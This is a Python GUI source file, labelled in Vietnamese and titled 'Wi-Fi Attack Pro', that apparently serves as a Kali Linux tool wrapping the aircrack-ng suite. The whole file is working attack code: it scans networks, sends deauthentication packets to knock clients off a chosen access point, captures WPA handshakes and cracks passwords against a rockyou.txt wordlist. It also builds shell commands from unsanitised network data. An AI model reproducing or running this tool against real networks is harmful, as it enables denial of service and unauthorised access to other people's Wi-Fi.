import os
import subprocess
import csv
import tkinter as tk
from tkinter import messagebox, filedialog
from ttkbootstrap import Style
from ttkbootstrap.widgets import Frame, Label, Button, Entry, Labelframe, Treeview

# ====== Thư mục lưu file handshake ======
SAVE_DIR = "/home/kali/b2203739"
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR, exist_ok=True)


class WifiAttackPro:
    def __init__(self, master):
        self.master = master
        self.master.title("Wi-Fi Attack Pro")
        self.master.geometry(f"{self.master.winfo_screenwidth()}x{self.master.winfo_screenheight()}+0+0")
        # Dùng theme hiện đại: darkly / cyborg / superhero / flatly / journal
        style = Style(theme="superhero")

        self.iface = "wlan0"
        self.networks = []
        self.scan_time = tk.IntVar(value=20)
        self.deauth_count = tk.IntVar(value=10)

        # ===== FRAME QUÉT WIFI =====
        scan_frame = Labelframe(master, text="Quét mạng Wi-Fi", padding=10)
        scan_frame.pack(fill="x", padx=10, pady=5)

        Label(scan_frame, text="Thời gian quét (giây):").pack(side="left", padx=5)
        Entry(scan_frame, width=5, textvariable=self.scan_time).pack(side="left")
        Button(scan_frame, text="Quét Wi-Fi", bootstyle="success", command=self.scan_wifi).pack(side="left", padx=10)

        # ===== DANH SÁCH WIFI =====
        frame_tree = Frame(master)
        frame_tree.pack(fill="both", expand=True, padx=10, pady=5)

        self.tree = Treeview(frame_tree, columns=("BSSID", "ESSID", "Kênh"), show="headings", height=12, bootstyle="info")
        self.tree.heading("BSSID", text="BSSID")
        self.tree.heading("ESSID", text="Tên mạng (ESSID)")
        self.tree.heading("Kênh", text="Kênh")

        self.tree.column("BSSID", width=200)
        self.tree.column("ESSID", width=300)
        self.tree.column("Kênh", width=80, anchor="center")
        self.tree.pack(fill="both", expand=True)

        # ===== FRAME DEAUTH =====
        deauth_frame = Labelframe(master, text="Tấn công Deauth (Kick client)", padding=10)
        deauth_frame.pack(fill="x", padx=10, pady=5)

        Label(deauth_frame, text="Số gói deauth:").pack(side="left", padx=5)
        Entry(deauth_frame, width=5, textvariable=self.deauth_count).pack(side="left")
        Button(deauth_frame, text="Gửi Deauth", bootstyle="danger", command=self.deauth_attack).pack(side="left", padx=10)

        # ===== FRAME HANDSHAKE =====
        handshake_frame = Labelframe(master, text="Bắt handshake & dò mật khẩu", padding=10)
        handshake_frame.pack(fill="x", padx=10, pady=5)

        Button(handshake_frame, text="Bắt Handshake", bootstyle="warning", command=self.capture_handshake).pack(side="left", padx=10)
        Button(handshake_frame, text="Dò mật khẩu từ .cap", bootstyle="primary", command=self.crack_password).pack(side="left", padx=10)

        # ===== STATUS =====
        self.status_label = Label(master, text="Trạng thái: Sẵn sàng", bootstyle="info")
        self.status_label.pack(pady=10)

    # ===== CẬP NHẬT STATUS =====
    def update_status(self, text, style="info"):
        self.status_label.config(text=f"Trạng thái: {text}", bootstyle=style)
        self.master.update_idletasks()

    # ===== QUÉT WIFI =====
    def scan_wifi(self):
        try:
            self.update_status("Đang quét Wi-Fi...", "warning")
            subprocess.run("sudo airmon-ng check kill", shell=True)
            subprocess.run(f"sudo airmon-ng start {self.iface}", shell=True)

            csv_file = "/tmp/wifi_scan-01.csv"
            scan_time = int(self.scan_time.get())

            subprocess.run(
                f"sudo timeout {scan_time} airodump-ng --output-format csv -w /tmp/wifi_scan {self.iface}",
                shell=True
            )

            wifi_list = []
            with open(csv_file, newline='') as f:
                reader = csv.reader(f)
                parsing = False
                for row in reader:
                    if len(row) > 0 and row[0].strip() == "BSSID":
                        parsing = True
                        continue
                    if parsing:
                        if len(row) < 14:
                            continue
                        bssid = row[0].strip()
                        channel = row[3].strip()
                        essid = row[13].strip()
                        if essid:
                            wifi_list.append((bssid, essid, channel))

            self.networks = wifi_list
            for i in self.tree.get_children():
                self.tree.delete(i)
            for wifi in self.networks:
                self.tree.insert("", tk.END, values=wifi)

            self.update_status("Đã quét xong Wi-Fi!", "success")
            messagebox.showinfo("Xong", "Đã quét xong Wi-Fi!")
        except Exception as e:
            self.update_status("Lỗi khi quét Wi-Fi", "danger")
            messagebox.showerror("Lỗi", str(e))

    # ===== GỬI DEAUTH =====
    def deauth_attack(self):
        selected_item = self.tree.focus()
        if not selected_item:
            messagebox.showwarning("Lỗi", "Chưa chọn Wi-Fi!")
            return
        selected = self.tree.item(selected_item)['values']
        bssid, essid, channel = selected
        count = int(self.deauth_count.get())

        self.update_status(f"Đang gửi {count} gói deauth...", "warning")
        subprocess.run(f"sudo iwconfig {self.iface} channel {channel}", shell=True)
        subprocess.Popen(f"sudo aireplay-ng --deauth {count} -a {bssid} {self.iface}", shell=True)
        self.update_status("Đã gửi deauth", "success")
        messagebox.showinfo("Đang gửi deauth", f"Đã gửi {count} gói deauth tới {bssid}")

    # ===== BẮT HANDSHAKE =====
    def capture_handshake(self):
        selected_item = self.tree.focus()
        if not selected_item:
            messagebox.showwarning("Chọn Wi-Fi", "Chưa chọn Wi-Fi!")
            return
        selected = self.tree.item(selected_item)['values']
        bssid, essid, channel = selected

        filename = os.path.join(SAVE_DIR, f"handshake_{bssid.replace(':', '')}")
        self.update_status("Đang mở terminal bắt handshake...", "warning")
        cmd = [
            "xterm", "-e",
            f"bash -c \"sudo airodump-ng --bssid {bssid} --channel {channel} -w '{filename}' {self.iface}; bash\""
        ]
        subprocess.Popen(cmd)
        self.update_status("Đã khởi động bắt handshake", "success")
        messagebox.showinfo("Hướng dẫn", "Chờ dòng 'WPA handshake' xuất hiện, sau đó Ctrl+C để lưu .cap")

    # ===== DÒ MẬT KHẨU =====
    def crack_password(self):
        file_path = filedialog.askopenfilename(title="Chọn file .cap", filetypes=[("Capture Files", "*.cap")])
        if not file_path:
            return
        top100k = "top100k.txt"
        if not os.path.exists(top100k):
            subprocess.run(f"head -n 100000 /usr/share/wordlists/rockyou.txt > {top100k}", shell=True)
        self.update_status(f"Đang dò mật khẩu...", "warning")
        cmd = [
            "xterm", "-e",
            f"bash -c \"echo 'Đang dò: {file_path}'; aircrack-ng -w {top100k} '{file_path}'; bash\""
        ]
        subprocess.Popen(cmd)
        self.update_status("Đã khởi động dò mật khẩu", "success")


if __name__ == '__main__':
    root = tk.Tk()
    app = WifiAttackPro(root)
    root.mainloop()
